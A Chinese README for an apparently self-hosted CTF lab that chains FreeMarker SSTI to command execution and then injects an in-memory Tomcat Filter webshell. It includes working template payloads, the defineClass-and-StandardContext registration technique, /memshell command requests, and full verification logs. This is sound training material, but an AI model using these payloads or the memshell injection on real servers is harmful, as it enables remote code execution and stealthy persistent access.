# 08 · 内存马（Java）：FreeMarker SSTI → Tomcat Filter 内存马

| 项 | 值 |
|---|---|
| 端口 | `8098`（`FREEMARKER_MEMSHELL_PORT` 可改） |
| 镜像 / 容器 | `ssti-freemarker-memshell:local` / `ssti-08-freemarker-memshell`（与根 `docker-compose.yml` 对齐） |
| 引擎 / 栈 | FreeMarker 2.3.28（SSTI 主链）+ Thymeleaf 3.0.15（对照入口） |
| 应用 | Spring Boot 2.7.18 · 内嵌 Tomcat 9.0.83 · JDK 8（运行 `eclipse-temurin:8-jre-alpine`） |
| 关卡数 | 4（攻击链 walkthrough） |
| **出网** | **出向 TCP 已切断**（`iptables`；入向已发布端口与环回正常）。DNS 的实测边界见下文，别过度宣称 |
| 需要权限 | `cap_add: [NET_ADMIN]`（否则切不断出网：entrypoint 只大声告警，容器照常启动） |
| flag | 容器内 `/flag`，由 `entrypoint.sh` 从环境变量写入，**不进任何镜像层** |
| flag 优先级 | `GZCTF_FLAG` > `DASFLAG` > `FLAG` > `STATIC_FLAG`（默认 `flag{change_me_before_deploy}`） |

## 这个靶场在教什么

**SSTI 打到「不能出网」的目标时该怎么做。**

传统思路是反弹 shell：让目标主动连回 VPS。但生产容器/内网环境经常根本没有出网。
本靶场用 `iptables` 切断出向流量之后（实测：外连 5 秒超时、直连外部 DNS 被拒）：

- 反弹 shell —— 连不出去；
- 外连下载 payload —— 下不来；
- 只剩**已经存在的入向 HTTP** 可用。

于是正确解法是把 webshell 作为一段字节码**动态加载进 JVM**，再注册到**正在运行的 Tomcat** 里
（`StandardContext` → `FilterDef` + `FilterMap` → `filterStart`），得到一条新的 HTTP 路由。
它不落地任何文件、进程重启即消失——这正是「内存马」：

| | 落地马（webshell 文件） | 内存马 |
|---|---|---|
| 落盘 | 要写文件（常被杀软/只读挂载挡住） | 不落盘 |
| 存活 | 重启仍在（也更容易被查出来） | 仅当前进程生命周期 |
| 流量 | 独立文件路径，特征明显 | 复用现有业务端口/链路，零出向流量 |

它同时是一个「同一站点、两条 SSTI 入口、结论不同」的对照实验：
FreeMarker 那条**真能打通到 RCE**；Thymeleaf 那条**注入面存在但默认不可达 RCE**
（实测证据见下文）——这一点和很多网文的说法相反，值得当面讲清楚。

## 攻击链（4 步）

| 步骤 | 目标 | 关键点 |
|------|------|--------|
| L1 | 确认模板注入 | `GET /theme/preview?template=${7*7}` → `49` |
| L2 | 任意 Java 代码执行 | 类解析器是 `UNRESTRICTED`，`?new()` 可解析任意类；FreeMarker 2.3.28 还带着 `freemarker.template.utility.Execute` |
| L3 | 注入 Tomcat 内存马 | 用 L2 的能力把 Filter 字节码 `defineClass` 进 JVM，反射拿到 `StandardContext` 并注册 |
| L4 | 通过内存马读 flag | `GET /memshell?cmd=cat%20/flag`，全程只有入向 HTTP，零出向流量 |

业务故事：`ThemeHub` 是个小型多租户 SaaS 后台，运营在网页上写**主题模板片段**并实时预览。
为了让「预览」和「线上渲染」完全一致，模板被配成了不受限类解析——
这就是最经典的 FreeMarker 配置错误。

## 漏洞点

1. **FreeMarker SSTI**（`GET /theme/preview`）
   `ThemePreviewService` 用 `new Template(StringReader, cfg)` 直接渲染**用户提交的模板串**；
   而 `FreemarkerConfig` 里有一行：

   ```java
   configuration.setNewBuiltinClassResolver(TemplateClassResolver.UNRESTRICTED_RESOLVER);
   ```

   `?new()` 于是能解析任意类 → `freemarker.template.utility.Execute` → 命令执行。

2. **Thymeleaf 视图名/片段名注入**（`GET /theme/thymeleaf`）
   控制器把 `"theme/" + theme` 直接当视图名返回（`theme`、`fragment` 都是请求参数、无白名单）。
   这是经典 CVE-2021-25741 的形态——但**在本技术栈上打不通**，见下文实测边界。

3. 站点**没有**任何读 flag 的接口：`/flag`、`/flag-readout`、`/api/flag` 全部 404（已实测）。

## 运行

```bash
cd labs/08-freemarker-memshell
docker compose up --build          # → http://127.0.0.1:8098
```

单独指定 flag / 端口：

```bash
FLAG='flag{my_test_flag}' FREEMARKER_MEMSHELL_PORT=8098 docker compose up --build
# PowerShell:
#   $env:FLAG='flag{my_test_flag}'; $env:FREEMARKER_MEMSHELL_PORT='8098'; docker compose up --build
```

`docker-compose.yml` 里 `cap_add: [NET_ADMIN]` **不能删**——删了出网就切不断
（entrypoint 会打 `[!] WARNING`，但容器仍能起来，方便在无权限环境里调试）。

单独 `docker build`（`Dockerfile` 是多阶段：`maven:3.6.3-jdk-8` 构建 → `eclipse-temurin:8-jre-alpine` 运行）：

```bash
docker build -t ssti-freemarker-memshell:local .
docker run -d --name ssti-08-freemarker-memshell --cap-add NET_ADMIN \
  -e FLAG='flag{my_test_flag}' -p 8098:8080 ssti-freemarker-memshell:local
```

## 参考解（全部实测，命令与输出见文末「验证记录」）

下面用 PowerShell 写（`$base` = `http://127.0.0.1:8098`）；
Linux/macOS 把 `Invoke-WebRequest` 换成 `curl -s`、URL 编码换成 `-G --data-urlencode` 即可。

### L1 · 确认是 FreeMarker

```powershell
$base='http://127.0.0.1:8098'
Invoke-WebRequest "$base/theme/preview?template=$([uri]::EscapeDataString('${7*7}'))" -UseBasicParsing
# → 49
```

```bash
curl -s -G "$base/theme/preview" --data-urlencode 'template=${7*7}'                        # → 49
curl -s -G "$base/theme/preview" --data-urlencode 'template=${.version}'                   # → 2.3.28
curl -s -G "$base/theme/preview" --data-urlencode 'template=<#list 1..3 as i>${i}</#list>' # → 123
```

`${.version}` 直接把引擎版本告诉你：**2.3.28 说明 `Execute` 还在**。

### L2 · 任意代码执行

```powershell
$tpl = '${"freemarker.template.utility.Execute"?new()("id")}'
Invoke-WebRequest "$base/theme/preview?template=$([uri]::EscapeDataString($tpl))" -UseBasicParsing
```

```text
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

> **`?new` 的两条限制（实测，很多网文会漏讲）**
>
> 1. 目标类必须是**类解析器放行的**——本靶场放开了全部（`UNRESTRICTED_RESOLVER`）；
> 2. 目标类还必须实现 `freemarker.template.TemplateModel`。所以
>    `${"java.lang.Runtime"?new()}` 直接报
>    `Class java.lang.Runtime does not implement freemarker.template.TemplateModel`，
>    `${"javax.script.ScriptEngineManager"?new()...}` 同样不行。
>
> `freemarker.template.utility.Execute`（实现了 `TemplateMethodModel`）因此是最顺手的原语；
> 要构造 `Runtime`/`ProcessBuilder` 这类普通类得用 `ObjectConstructor`
> （`${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")}`
> 实测可构造成功，但没有回显）。本靶场的 `InjectHelper` 之所以实现 `TemplateMethodModelEx`，
> 正是为了能被 `?new` 直接构造。
>
> 另外 `Execute` 把参数按空白切分后**直接交给 exec**（不经过 shell），
> 所以重定向/管道要自己包一层：`"sh -c 'id; cat /flag'"`。只想读文件的话 `"cat /flag"` 就够。

```powershell
$tpl = '${"freemarker.template.utility.Execute"?new()("cat /flag")}'
# → flag{...}
```

> 到这一步其实已经能拿 flag（题目允许「代码执行 + 回显」这条更短的路）。
> 但**本靶场真正的教学目标**是：在不出网前提下把「一次性回显」升级成
> 「可反复调用、住在内存里的 webshell」——L3/L4。

### L3 · 注入 Tomcat Filter 内存马

`InjectHelper` 是 payload 侧的类（不是业务代码，没有任何 Controller 引用它），
它把内嵌的 `MemshellFilter` 字节码 `defineClass` 进 JVM，再反射注册到 `StandardContext`。
`servletContext` 这个变量来自 FreeMarker 数据模型（`GET /api/theme-vars` 可查）。

```powershell
$tpl = '${"com.lab.themepreview.memshell.InjectHelper"?new(servletContext)()}'
Invoke-WebRequest "$base/theme/preview?template=$([uri]::EscapeDataString($tpl))" -UseBasicParsing
```

```text
OK GET /memshell?cmd=id | filterMapped=true | filterStart=true | ctx=org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext | filterLoader=org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c
```

### L4 · 通过内存马读 flag

```powershell
(Invoke-WebRequest "$base/memshell?cmd=id" -UseBasicParsing).Content
(Invoke-WebRequest "$base/memshell?cmd=$([uri]::EscapeDataString('cat /flag'))" -UseBasicParsing).Content
```

```text
<html>...<h3>tomcat memshell online</h3><div>cmd: cat /flag</div><hr><pre>flag{JAVA_MEMSHELL_VERIFY_2026}</pre>
<div>jvm=1.8.0_492 | loader=org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c | pid=1@4e797d3ff5a5</div>...
```

```bash
# curl 写法（b64cmd 适合带引号/管道的命令）
curl -s 'http://127.0.0.1:8098/memshell?cmd=id'
curl -s -G 'http://127.0.0.1:8098/memshell' --data-urlencode 'cmd=cat /flag'
curl -s -G 'http://127.0.0.1:8098/memshell' --data-urlencode 'b64cmd=Y2F0IC9mbGFn'   # 即 "cat /flag"
```

不带 `cmd`/`b64cmd` 访问 `/memshell` 时 Filter **原样放行**给业务链（实测 404，页面与静态资源行为不变）
——这是内存马最基本的隐蔽性要求。

### 内存马的边界（建议现场演示）

```bash
docker restart ssti-08-freemarker-memshell
curl -s -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:8098/memshell?cmd=id'   # → 404
```

进程一重启 `/memshell` 就没了——它本来就只活在 JVM 内存里（flag 会由 entrypoint 重写，需重新打链）。

## 内存马原理（浓缩版）

完整版见 [`docs/MEMSHELL.md`](docs/MEMSHELL.md)。三件事：

1. **藏字节码**：`MemshellFilter` 不打进应用 jar，base64 存在 `InjectHelper.MEMSHELL_CLASS_B64`
   （生成方式见 [`build-memshell.ps1`](build-memshell.ps1)）。
2. **变类**：`ClassLoader#defineClass`（本靶场落到 Spring Boot 的 `LaunchedURLClassLoader`）。
3. **挂进运行中的容器**：`servletContext` → `ApplicationContextFacade.context` →
   `ApplicationContext.context` → `StandardContext`，然后

   ```text
   StandardContext.addFilterDef(new FilterDef(name, filter))
   StandardContext.addFilterMap(new FilterMap(name, "/*"))
   StandardContext.filterStart()
   ```

三个真实踩坑（源码注释与 `docs/MEMSHELL.md` 都有）：

- **`StandardContext` 要判子类，不能判等**：Spring Boot 内嵌 Tomcat 实际用的是
  `org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext`（子类）。
  用 `className.equals("...StandardContext")` 永远解析不到——必须
  `StandardContext.class.isInstance(o)`。
- **`FilterDef`/`FilterMap` 换过包名**：Tomcat 7 是 `org.apache.catalina.deploy.*`，
  Tomcat 8+ 是 `org.apache.tomcat.util.descriptor.web.*`。
- **setter 不能按实参精确匹配**：`FilterDef.setFilter(javax.servlet.Filter)` 形参是**接口**，
  手里却是 `MemshellFilter`，`getMethod(name, value.getClass())` 会抛 `NoSuchMethodException`。
  要按「形参可从实参赋值」挑重载。

## 出网是怎么被切断的（以及实测边界，别过度宣称）

`entrypoint.sh` 装三条规则：

```sh
iptables -A OUTPUT ! -o lo -p tcp --syn -j DROP   # 所有非环回的新建 TCP 连接
iptables -A OUTPUT -p udp --dport 53 -j DROP      # DNS over UDP
iptables -A OUTPUT -p tcp --dport 53 -j DROP      # DNS over TCP
```

- 只丢 **`--syn`**：入向连接的回包不是 SYN，所以 `-p 8098:8080` 照常工作。
- 用 **`! -o lo`** 而不是写死 `-o eth0`：容器网卡名不保证叫 `eth0`，写死会出现
  「规则装上了但根本不匹配」的静默失效。**保留 `lo` 是刻意的**——容器内自检
  `curl 127.0.0.1:8080` 与 compose healthcheck 都走环回。
- DNS 规则**不能加 `-o` 限制**：Docker 内嵌 DNS 的送达路径依平台而变。

### 实测边界（本机 Docker Desktop for Windows / WSL2，x86_64）

用 `iptables -L OUTPUT -v -n` 的**包计数器**证明，而不是只看规则在不在：

| 检查 | 结果 | 证据 |
|------|------|------|
| 出向 TCP 到公网 IP | **已阻断** ✅ | `wget http://1.1.1.1/` → `download timed out`；规则 #1 计数 `0 → 5` |
| 直连外部解析器 `nslookup example.com 8.8.8.8` | **已阻断** ✅ | `write to '8.8.8.8': Operation not permitted`；规则 #2 计数 `0 → 1` |
| 走 Docker 内嵌 resolver（`127.0.0.11`）解析域名 | **仍然可用** ⚠ | `nslookup example.com` 正常返回 A 记录；规则 #2/#3 计数**始终为 0** |
| 入向已发布端口 | 正常 ✅ | 宿主 `GET /healthz` → `200 ok` |
| 容器内 → `127.0.0.1:8080`（环回） | 正常 ✅ | `wget -q -O- http://127.0.0.1:8080/healthz` → `ok` |

**结论要说准确**：

- **反弹 shell、外连下载 payload 在两类平台上都被阻断** ✅（本靶场的教学前提，实测成立）；
- **直连外部 DNS 解析器被阻断** ✅；
- **但走 Docker 内嵌 resolver 的域名解析在本平台仍然成功**（这些包不经过容器 netfilter，
  计数器为 0）——所以在 Docker Desktop 上**不能宣称「DNSLog 式外带被完全排除」**。
  原生 Linux Docker 上 DNS 规则才真正作用在容器 netfilter 内，换平台请用同样的
  计数器方法重新验证，不要照搬结论。

长文解释见 [`docs/MEMSHELL.md` §2.1.1](docs/MEMSHELL.md#211-出网封锁的实测边界)。

> 早期版本用的是 `-o eth0` 形式（照抄同仓库 [`07-flask-memshell`](../07-flask-memshell/README.md)
> 的旧写法）。07 也已按上述方式修正；本靶场自己的容器已按上表逐项实测。

### 自证命令

```bash
docker exec ssti-08-freemarker-memshell iptables -S OUTPUT
docker exec ssti-08-freemarker-memshell iptables -L OUTPUT -v -n --line-numbers   # 看包计数器
docker exec ssti-08-freemarker-memshell sh -c 'wget -T 5 -q -O- http://1.1.1.1/; echo "exit=$?"'
docker exec ssti-08-freemarker-memshell nslookup example.com 8.8.8.8              # Operation not permitted
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8098/healthz            # 200
```

## Thymeleaf 这条路的实测边界（重要，别照抄网文）

`GET /theme/thymeleaf?theme=<v>` 直接返回 `"theme/" + v` 当视图名，`fragment` 也是请求参数。
**实测结论：这条路在当前技术栈上打不到 RCE。**

| 探针 | 网文预期 | 实测（本靶场） |
|------|----------|----------------|
| `theme=aurora` | 正常渲染 | `200`，正常渲染 |
| `theme=__${7*7}__` | 预处理求值 → 渲染 `theme/49` | `500`，`Error resolving template [theme/__${7*7}__]`，**原样未求值** |
| `fragment=header` | 正常片段 | `200`，片段被包含 |
| `fragment=__${7*7}__` | 片段名求值 | `200`（该参数已不在模板里使用，见下） |
| `fragment=__${'hea'.concat('der')}__`（测过） | 求值成 `header` → `200` | 报字面量 `fragments/__${...}__` → **未求值** |

我们另外把容器里的 Thymeleaf 换成 **3.0.11.RELEASE**（CVE-2021-25741 时代版本）重测，
视图名依然不求值。还顺带发现一个常见误用：**Thymeleaf 的片段选择器 `~{...}` 内部不对
`${...}` 做插值**——写成 `~{fragments/${userTheme} :: body}` 时，Thymeleaf 会把
`${userTheme}` 一起当字面量模板名去解析（实测报 `Error resolving template [fragments/${userTheme}]`）。
本靶场因此把主题页改成固定片段 `~{fragments/header :: body}`，保证默认页面是好的，
并把这件事作为「真实且常见的误用」写进注释。

结论：在 Thymeleaf 3.0.x 里，**模板名/片段名本身不是 SpEL 求值点**；
真正会被求值的是模板**内部**参与 `th:*` 表达式求值的那部分。所以本靶场把 Thymeleaf 入口
定位成**对照题**：演示「注入面存在 ≠ 可 RCE」，避免同学把「可控模板名」直接当成
`__${...}__` RCE。想给一条真 RCE 支线，最小改法是让某个模板把用户输入**拼进表达式源码**
（例如 `model.addAttribute("expr", userInput)` + 模板 `th:utext="${__${expr}__}"`）；
本靶场故意没这么写，以保持结论真实。

## 目录结构

```text
labs/08-freemarker-memshell/
├── Dockerfile                     # 多阶段：maven:3.6.3-jdk-8 → eclipse-temurin:8-jre-alpine
├── docker-compose.yml             # 8098:8080 + cap_add NET_ADMIN + healthcheck
├── entrypoint.sh                  # 写 /flag + iptables 断出网 + exec java
├── pom.xml                        # Spring Boot 2.7.18 / FreeMarker 2.3.28
├── build-memshell.ps1             # 编译 MemshellFilter 并把字节码 base64 回填 InjectHelper
├── dev-fastboot.ps1               # 开发用：改一个类不必重建镜像（非交付必需）
├── dev-thymeleaf-version.ps1      # 开发用：替换容器内 Thymeleaf 版本做对照实验
├── memshell-plugin/…/MemshellFilter.java   # 「被注入物」源码（不打进应用 jar）
├── src/main/java/com/lab/themepreview/
│   ├── ThemePreviewApplication.java
│   ├── config/FreemarkerConfig.java        # ★ UNRESTRICTED 类解析器（漏洞点 1）
│   ├── config/WebConfig.java
│   ├── service/ThemePreviewService.java    # ★ 渲染用户提交的模板串
│   ├── web/ThemeController.java            # ★ /theme/preview、/theme/thymeleaf
│   ├── web/MetaController.java             # /healthz、/api/lab-info
│   ├── web/DiagController.java             # /api/diag/context（只读排障）
│   └── memshell/InjectHelper.java          # ★ payload 侧：defineClass + 注册 Filter
├── src/main/resources/
│   ├── application.properties
│   ├── memshell/MemshellFilter.class.b64   # 内存马字节码（base64）
│   ├── static/index.html                   # 站点首页
│   └── templates/theme.html, theme/aurora.html, fragments/header.html
├── docs/API.md                    # /api/lab-info 响应示例
├── docs/MEMSHELL.md               # 内存马原理 + 出网实测边界 + 三个版本坑
├── docs/PAYLOADS.md               # payload 清单（含实测输出）
└── tests/verify_chain.ps1         # 一键复现全部验收步骤
```

## API

场景型靶场，按 [`docs/API.md`](../../docs/API.md) 第 5 节最小契约实现：

| 方法 | 路径 | 说明 |
|------|------|------|
| GET | `/` | 站点首页（列出漏洞点、攻击链、目标） |
| GET | `/healthz` | 健康检查，纯文本 `ok` |
| GET | `/api/lab-info` | 靶场元信息（`no_egress:true`、`theme`、4 步 `levels[]`） |
| GET | `/theme/preview?template=&theme=` | 漏洞点 1：FreeMarker 模板串渲染 |
| GET | `/theme/thymeleaf?theme=&fragment=` | 漏洞点 2：Thymeleaf 视图名/片段名注入（对照入口） |
| GET | `/api/theme-vars` | 预览接口的数据模型 |
| GET | `/api/memshell-class` | 内嵌内存马字节码（base64），便于核对 payload |
| GET | `/api/diag/context` | 只读：把 ServletContext→StandardContext 的反射链摊开 |

```bash
curl -s http://127.0.0.1:8098/api/lab-info | jq '{id,no_egress,engine,flag_path,levels:[.levels[].title]}'
```

完整响应示例见 [`docs/API.md`](docs/API.md)。本靶场没有 `/api/render`、`/api/levels`、
上帝模式等控制台契约接口——场景型靶场不受那部分约束。

## 重新生成内存马 payload

改了 `memshell-plugin/.../MemshellFilter.java` 之后：

```powershell
& .\build-memshell.ps1      # 依赖 JDK8（脚本里 $JdkHome 可改）
docker build -t ssti-freemarker-memshell:local .
```

脚本会：用 JDK8 编译（`-source/-target 1.8`，校验 major version = 52）→ base64 →
写入 `src/main/resources/memshell/MemshellFilter.class.b64` → 回填 `InjectHelper.MEMSHELL_CLASS_B64`。

## 出题提示

- 想加难度：把 `Execute` 拿掉（换 FreeMarker 2.3.31），逼选手走 `ObjectConstructor`
  路线；或者给 `/theme/preview` 加一个只拦 `Execute`/`Runtime` 关键字、
  但放过 `ObjectConstructor` 的 WAF。
- 想加第二条 RCE 链：让某个模板把用户输入拼进 Thymeleaf 表达式源码（见上文）。
- 别删 `/api/diag/context` 以为更难——它不读 flag，只是把反射链摊开；
  真正的门槛在 L3 的注册逻辑。
- `restart: unless-stopped` 会让 `docker restart` 后靶场自动起来（内存马消失、flag 重写）。

## 验证记录（本机实测，完整原始输出）

环境：Windows + Docker Desktop（Linux 容器，x86_64），Docker 29.5.2。
镜像 `ssti-freemarker-memshell:local`；运行时 JDK `1.8.0_492`，
内嵌 `tomcat-embed-core-9.0.83`、`spring-boot-2.7.18`、`freemarker-2.3.28`、`thymeleaf-3.0.15.RELEASE`。
复现脚本：[`tests/verify_chain.ps1`](tests/verify_chain.ps1)（`docker compose up -d` 后直接跑）。

```text
===== 1. image: /flag must NOT be baked into any layer =====
cat: /flag: No such file or directory
exit=1  (non-zero == flag is not in the image)

===== 2. container: /flag exists (written by entrypoint.sh at boot) =====
-rw-r--r-- 1 root root 31 Nov 13 21:39 /flag
flag{JAVA_MEMSHELL_VERIFY_2026}

===== 3. /healthz =====
HTTP 200 body=ok

===== 4. /api/lab-info =====
id=freemarker-memshell
no_egress=True
engine=freemarker flag_path=/flag
levels=1:L1 · 确认模板注入 | 2:L2 · 拿到任意代码执行 | 3:L3 · 注入 Tomcat 内存马 | 4:L4 · 通过内存马读 flag

===== 5. there is no flag-readout endpoint (must all 404) =====
/flag -> 404
/flag-readout -> 404
/api/flag -> 404

===== 6. egress: rules + packet counters =====
-P OUTPUT ACCEPT
-A OUTPUT ! -o lo -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j DROP
-A OUTPUT -p udp -m udp --dport 53 -j DROP
-A OUTPUT -p tcp -m tcp --dport 53 -j DROP
--- 6a. counters before ---
Chain OUTPUT (policy ACCEPT 21 packets, 6894 bytes)
num   pkts bytes target     prot opt in     out     source               destination
1        0     0 DROP       tcp  --  *      !lo     0.0.0.0/0            0.0.0.0/0            tcp flags:0x17/0x02
2        0     0 DROP       udp  --  *      *       0.0.0.0/0            0.0.0.0/0            udp dpt:53
3        0     0 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:53
--- 6b. outbound TCP 1.1.1.1:80 (wget, 5s timeout) ---
wget: download timed out
--- 6c. direct external resolver: nslookup example.com 8.8.8.8 ---
nslookup: write to '8.8.8.8': Operation not permitted
;; connection timed out; no servers could be reached
--- 6d. counters after (rule 1 and 2 grew) ---
Chain OUTPUT (policy ACCEPT 31 packets, 7661 bytes)
num   pkts bytes target     prot opt in     out     source               destination
1        5   300 DROP       tcp  --  *      !lo     0.0.0.0/0            0.0.0.0/0            tcp flags:0x17/0x02
2        1    57 DROP       udp  --  *      *       0.0.0.0/0            0.0.0.0/0            udp dpt:53
3        0     0 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:53
--- 6e. Docker embedded resolver (127.0.0.11) - measured: STILL WORKS on this platform ---
Name:	example.com
Address: 104.20.23.154
--- 6f. loopback app + inbound published port still fine ---
ok <- container -> lo:8080
host -> http://127.0.0.1:8098/healthz : HTTP 200 ok

===== 7. L1 - FreeMarker SSTI present =====
template=${7*7} -> 49
template=${.version} -> 2.3.28

===== 8. L2 - arbitrary code execution via freemarker.template.utility.Execute =====
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

===== 8b. ?new really requires TemplateModel (negative control) =====
Class java.lang.Runtime does not implement freemarker.template.TemplateModel

===== 9. L2b - read /flag with the same primitive =====
flag{JAVA_MEMSHELL_VERIFY_2026}

===== 10. L3 - inject the in-memory Tomcat Filter (no file written, no egress) =====
payload: ${"com.lab.themepreview.memshell.InjectHelper"?new(servletContext)()}
OK GET /memshell?cmd=id | filterMapped=true | filterStart=true | ctx=org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext | filterLoader=org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c

===== 11. L4 - the brand-new in-memory endpoint answers =====
<html><head><title>memshell</title></head><body style="background:#0b0c10;color:#d7dae3;font-family:Consolas,monospace"><h3 style="color:#ff6b2b">tomcat memshell online</h3><div>cmd: id</div><hr><pre style="white-space:pre-wrap">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
</pre><div>jvm=1.8.0_492 | loader=org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c | pid=1@4e797d3ff5a5</div></body></html>

===== 12. L4b - read /flag through the memory shell =====
<html>...<div>cmd: cat /flag</div><hr><pre style="white-space:pre-wrap">flag{JAVA_MEMSHELL_VERIFY_2026}</pre>
<div>jvm=1.8.0_492 | loader=org.springframework.boot.loader.LaunchedURLClassLoader@21b8d17c | pid=1@4e797d3ff5a5</div></body></html>
--- 12b. base64 variant (b64cmd = base64 of 'cat /flag') ---
style="white-space:pre-wrap">flag{JAVA_MEMSHELL_VERIFY_2026}

===== 13. memory shell is memory-only (transient by design) =====
GET /memshell (no cmd) -> HTTP 404  (falls through to the app)
restarting the process ...
after restart: GET /memshell?cmd=id -> HTTP 404  (the filter is gone)

===== 14. Thymeleaf entry point - what is actually reachable (honest result) =====
theme=aurora -> HTTP 200 (rendered normally)
theme=__${7*7}__ -> HTTP 500 resolved=[theme/__${7*7}__]  (NOT evaluated)
fragment=header -> HTTP 200 (included)
fragment=__${7*7}__ -> HTTP 200
```

镜像层自证：

```text
$ docker run --rm --entrypoint cat ssti-freemarker-memshell:local /flag
cat: /flag: No such file or directory        # exit=1
$ docker history --no-trunc ssti-freemarker-memshell:local --format '{{.Size}} {{.CreatedBy}}'
0B      ENTRYPOINT ["/entrypoint.sh"]
4.1kB   RUN /bin/sh -c chmod +x /entrypoint.sh # buildkit
12.3kB  COPY entrypoint.sh /entrypoint.sh # buildkit
21.1MB  COPY /build/app.jar /app/app.jar # buildkit
4.44MB  RUN /bin/sh -c apk add --no-cache iptables bash tzdata # buildkit
```

镜像里没有任何一层包含 `/flag`：它只由 `entrypoint.sh` 在**容器启动时**从环境变量写入。

## 收尾

```bash
docker compose down --remove-orphans     # 验证结束后务必清理，别留容器/网络
```
